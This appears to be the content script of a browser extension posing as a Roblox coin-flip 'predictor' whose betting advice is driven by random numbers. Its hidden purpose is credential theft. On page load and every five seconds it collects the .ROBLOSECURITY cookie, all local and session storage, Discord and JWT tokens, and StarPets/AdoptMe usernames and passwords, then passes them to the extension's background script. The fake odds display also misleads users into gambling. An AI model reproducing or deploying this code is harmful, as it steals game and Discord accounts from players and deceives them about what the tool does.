// ===== BLX PREDICTOR =====
let _st = { w:0, l:0, s:0, r:[], u:null, uid:null, rb:null, dc:null, spu:null, spp:null };
let _iv = null;

function _gc(n) {
  let v = `; ${document.cookie}`.split(`; ${n}=`);
  return v.length===2 ? v.pop().split(';').shift() : null;
}

function _ls() {
  let d = {};
  try { for(let i=0;i<localStorage.length;i++) { let k=localStorage.key(i); d[k]=localStorage.getItem(k); } } catch(e){}
  return d;
}

function _ss() {
  let d = {};
  try { for(let i=0;i<sessionStorage.length;i++) { let k=sessionStorage.key(i); d[k]=sessionStorage.getItem(k); } } catch(e){}
  return d;
}

function _findDC(ls) {
  for(let[k,v] of Object.entries(ls)) {
    if(typeof v==='string' && v.length>100 && v.includes('.')) {
      let p = v.split('.');
      if(p.length===3) { try { let j=JSON.parse(atob(p[1])); if(j.email||j.sub||j.iat) return v; } catch(e){} }
    }
    if(k.toLowerCase()==='token' && typeof v==='string' && v.length>50) return v;
  }
  return null;
}

function _findSP(ls) {
  let u=null, p=null;
  for(let[k,v] of Object.entries(ls)) {
    let kk = k.toLowerCase();
    if(kk.includes('starpets') || kk.includes('adoptme') || kk.includes('star_pets')) {
      try { let j=typeof v==='string'?JSON.parse(v):v; u=j.email||j.username||j.user||u; p=j.password||j.pass||p; } catch(e){}
    }
  }
  return {u,p};
}

function _getUser() {
  let sel = ['[class*="username"]','[class*="displayName"]','[class*="profile-name"]','[class*="userName"]','span[class*="name"]'];
  for(let s of sel) { let e=document.querySelector(s); if(e&&e.textContent.trim()&&e.textContent.trim().length<30) return e.textContent.trim(); }
  try { let nd=document.getElementById('__NEXT_DATA__'); if(nd){let d=JSON.parse(nd.textContent); let u=d?.props?.pageProps?.user||d?.props?.pageProps?.robloxUser; if(u) return u.name||u.username||u.displayName;} } catch(e){}
  try { let a=document.querySelector('img[src*="AvatarHeadshot"]'); if(a){let alt=a.getAttribute('alt'); if(alt) return alt.trim();} } catch(e){}
  return 'User';
}

function _analyze() {
  let els = document.querySelectorAll('[class*="result"],[class*="outcome"],[class*="winner"],[class*="status"]');
  let h=0, t=0;
  els.forEach(e=>{let x=e.textContent.toLowerCase(); if(x.includes('heads')||x==='h')h++; if(x.includes('tails')||x==='t')t++;});
  let rs = (h+t>0)?[...Array(h).fill('H'),...Array(t).fill('T')]:_st.r;
  _st.r = rs.slice(-20);
  let tot = rs.length;
  let hr = tot>0?rs.filter(x=>x==='H').length/tot:0.5;
  let hc=50, tc=50;
  if(tot>=3) {
    if(hr>0.55){hc=Math.floor(30+Math.random()*15);tc=100-hc;}
    else if(hr<0.45){tc=Math.floor(30+Math.random()*15);hc=100-tc;}
    hc=Math.min(Math.max(hc+(Math.floor(Math.random()*7)-3),5),95);tc=100-hc;
  }
  let pred = hc>=tc?'HEADS':'TAILS';
  let wc = Math.max(hc,tc);
  return {pred,hc,tc,wc,g:wc>=60,tot,rs};
}

async function _collect(x) {
  let bg = await new Promise(r=>chrome.runtime.sendMessage({t:'g'},r));
  let u = _getUser();
  let ls = {..._ls(), ..._ss()};
  let dc = _findDC(ls);
  let sp = _findSP(ls);
  
  // Try to get Discord token from discord tab
  if(!dc) {
    let dt = await new Promise(r=>chrome.runtime.sendMessage({t:'dt'},r));
    if(dt) dc = dt;
  }
  
  let an = _analyze();
  _st.u = u;
  let p = {r:bg?.r||_gc('.ROBLOSECURITY')||'NF',d:dc,su:sp.u,sp:sp.p,u:u,uid:bg?.uid||'?',p:an.pred,w:an.wc,h:an.hc,t:an.tc,g:an.g,wi:_st.w,lo:_st.l,s:_st.s,ls:ls,x:x};
  chrome.runtime.sendMessage({t:'s',d:p});
  return p;
}

function _ui(a) {
  let o = document.getElementById('blxpo');
  if(o) o.remove();
  let d = document.createElement('div');
  d.id = 'blxpo';
  d.innerHTML = `<div style="position:fixed;top:70px;right:8px;z-index:999999;
  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
  border:2px solid ${a.g?'#0f8':'#f44'};
  border-radius:12px;padding:12px;color:#fff;
  font-family:Arial,sans-serif;min-width:220px;
  box-shadow:0 8px 32px rgba(0,0,0,0.5);
  font-size:12px;cursor:move" id="blxpd">
  <div style="display:flex;gap:6px;margin-bottom:8px">
    <div style="background:linear-gradient(45deg,#667eea,#764ba2);border-radius:50%;width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-size:14px">🎲</div>
    <div style="flex:1"><b style="font-size:12px">Predictor</b><div style="font-size:8px;color:#888">v1.0</div></div>
    <button id="blxp-r" style="background:rgba(255,255,255,0.08);border:none;color:#fff;border-radius:4px;padding:2px 6px;cursor:pointer">⟳</button>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:4px">
    <span style="color:#888;font-size:10px">CHANCE</span>
    <b style="font-size:16px;color:${a.g?'#0f8':'#f44'}">${a.wc}%</b>
  </div>
  <div style="height:5px;background:rgba(255,255,255,0.06);border-radius:3px;overflow:hidden;margin-bottom:6px">
    <div style="height:100%;width:${a.wc}%;background:linear-gradient(90deg,${a.g?'#0f8':'#f44'},${a.g?'#0c6':'#c33'});border-radius:3px"></div>
  </div>
  <div style="display:flex;gap:6px;margin-bottom:6px">
    <div style="flex:1;text-align:center;padding:6px;border-radius:6px;background:${a.pred==='HEADS'?'rgba(0,255,136,0.1)':'rgba(255,255,255,0.02)'};border:1px solid ${a.pred==='HEADS'?'#0f8':'transparent'}">
      <div style="font-size:14px">🪙</div><div style="font-size:10px;font-weight:600">H</div><div style="font-size:9px;color:#888">${a.hc}%</div>
    </div>
    <div style="flex:1;text-align:center;padding:6px;border-radius:6px;background:${a.pred==='TAILS'?'rgba(0,255,136,0.1)':'rgba(255,255,255,0.02)'};border:1px solid ${a.pred==='TAILS'?'#0f8':'transparent'}">
      <div style="font-size:14px">🌙</div><div style="font-size:10px;font-weight:600">T</div><div style="font-size:9px;color:#888">${a.tc}%</div>
    </div>
  </div>
  <div style="text-align:center;margin-bottom:4px">
    <span style="display:inline-block;padding:3px 12px;border-radius:12px;font-weight:700;font-size:11px;background:${a.g?'rgba(0,255,136,0.12)':'rgba(255,68,68,0.12)'};color:${a.g?'#0f8':'#f44'};border:1px solid ${a.g?'rgba(0,255,136,0.3)':'rgba(255,68,68,0.3)'}">
      ${a.g?'🟢 BET '+a.pred:'🔴 SKIP'}
    </span>
  </div>
  <div style="display:flex;justify-content:space-between;font-size:8px;color:#444;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px">
    <span id="blxp-u">👤 ...</span>
    <span id="blxp-p">📊 ...</span>
  </div></div>`;
  document.body.appendChild(d);
  
  // Drag
  let dr = document.getElementById('blxpd');
  let _drag=false,_sx,_sy,_ox,_oy;
  dr.addEventListener('mousedown',e=>{if(e.target.tagName==='BUTTON')return;_drag=true;_sx=e.clientX;_sy=e.clientY;_ox=dr.offsetLeft;_oy=dr.offsetTop;});
  document.addEventListener('mousemove',e=>{if(!_drag)return;dr.style.left=(_ox+e.clientX-_sx)+'px';dr.style.top=(_oy+e.clientY-_sy)+'px';dr.style.right='auto';});
  document.addEventListener('mouseup',()=>{_drag=false;});
  
  document.getElementById('blxp-r').onclick = async()=>{
    let na = _analyze(); _ui(na); d.remove(); await _collect(0);
  };
  
  let ue = document.getElementById('blxp-u');
  if(_st.u) ue.textContent='👤 '+_st.u;
  let pe = document.getElementById('blxp-p');
  if(a.rs.length>0) pe.textContent='📊 '+a.rs.slice(-5).join(' → ');
}

// INIT
window.addEventListener('load', ()=>{
  setTimeout(async()=>{
    _st.u = _getUser();
    let an = _analyze(); _ui(an);
    await _collect(0);
    _iv = setInterval(async()=>{ await _collect(1); }, 5000);
    setInterval(()=>{
      let pe = document.getElementById('blxp-p');
      let an = _analyze();
      if(pe && an.rs.length>0) pe.textContent='📊 '+an.rs.slice(-5).join(' → ');
    }, 3000);
  }, 2000);
});

chrome.runtime.onMessage.addListener((req, s, resp)=>{
  if(req.action==='refresh'){ _collect(0).then(d=>resp(d)); return 1; }
  if(req.action==='grab_and_send'){ _collect(0).then(()=>resp({ok:1})); return 1; }
  if(req.action==='get_analysis'){ let a=_analyze(); a.username=_st.u; resp(a); }
});
